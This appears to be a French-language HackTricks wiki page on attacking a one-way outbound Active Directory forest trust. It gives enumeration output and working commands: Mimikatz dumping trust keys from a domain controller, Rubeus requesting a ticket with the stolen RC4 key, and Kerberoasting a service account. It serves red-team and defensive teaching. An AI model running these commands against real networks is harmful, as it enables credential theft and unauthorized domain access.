# External Forest Domain - One-Way (Outbound)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

Dans ce scénario, **votre domaine** **fait confiance** à certains **privilèges** d'un principal provenant de **domaines différents**.

## Énumération

### Confiance sortante
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

Une vulnérabilité de sécurité existe lorsqu'une relation de confiance est établie entre deux domaines, identifiés ici comme le domaine **A** et le domaine **B**, où le domaine **B** étend sa confiance au domaine **A**. Dans cette configuration, un compte spécial est créé dans le domaine **A** pour le domaine **B**, qui joue un rôle crucial dans le processus d'authentification entre les deux domaines. Ce compte, associé au domaine **B**, est utilisé pour chiffrer les tickets d'accès aux services entre les domaines.

L'aspect critique à comprendre ici est que le mot de passe et le hachage de ce compte spécial peuvent être extraits d'un contrôleur de domaine dans le domaine **A** en utilisant un outil en ligne de commande. La commande pour effectuer cette action est :
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Cette extraction est possible car le compte, identifié par un **$** après son nom, est actif et appartient au groupe "Domain Users" du domaine **A**, héritant ainsi des permissions associées à ce groupe. Cela permet aux individus de s'authentifier contre le domaine **A** en utilisant les identifiants de ce compte.

**Avertissement :** Il est possible de tirer parti de cette situation pour obtenir un accès dans le domaine **A** en tant qu'utilisateur, bien que avec des permissions limitées. Cependant, cet accès est suffisant pour effectuer une énumération sur le domaine **A**.

Dans un scénario où `ext.local` est le domaine de confiance et `root.local` est le domaine de confiance, un compte utilisateur nommé `EXT$` serait créé dans `root.local`. Grâce à des outils spécifiques, il est possible de dumper les clés de confiance Kerberos, révélant les identifiants de `EXT$` dans `root.local`. La commande pour y parvenir est :
```bash
lsadump::trust /patch
```
Suite à cela, on pourrait utiliser la clé RC4 extraite pour s'authentifier en tant que `root.local\EXT$` au sein de `root.local` en utilisant une autre commande d'outil :
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Cette étape d'authentification ouvre la possibilité d'énumérer et même d'exploiter des services au sein de `root.local`, tels que réaliser une attaque Kerberoast pour extraire les identifiants de compte de service en utilisant :
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Récupération du mot de passe de confiance en clair

Dans le flux précédent, le hachage de confiance a été utilisé au lieu du **mot de passe en clair** (qui a également été **extrait par mimikatz**).

Le mot de passe en clair peut être obtenu en convertissant la sortie \[ CLEAR ] de mimikatz de l'hexadécimal et en supprimant les octets nuls ‘\x00’ :

![](<../../.gitbook/assets/image (938).png>)

Parfois, lors de la création d'une relation de confiance, un mot de passe doit être saisi par l'utilisateur pour la confiance. Dans cette démonstration, la clé est le mot de passe de confiance original et donc lisible par l'homme. Au fur et à mesure que la clé change (tous les 30 jours), le mot de passe en clair ne sera pas lisible par l'homme mais techniquement toujours utilisable.

Le mot de passe en clair peut être utilisé pour effectuer une authentification régulière en tant que compte de confiance, une alternative à la demande d'un TGT en utilisant la clé secrète Kerberos du compte de confiance. Ici, interrogation de root.local depuis ext.local pour les membres des Domain Admins :

![](<../../.gitbook/assets/image (792).png>)

## Références

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
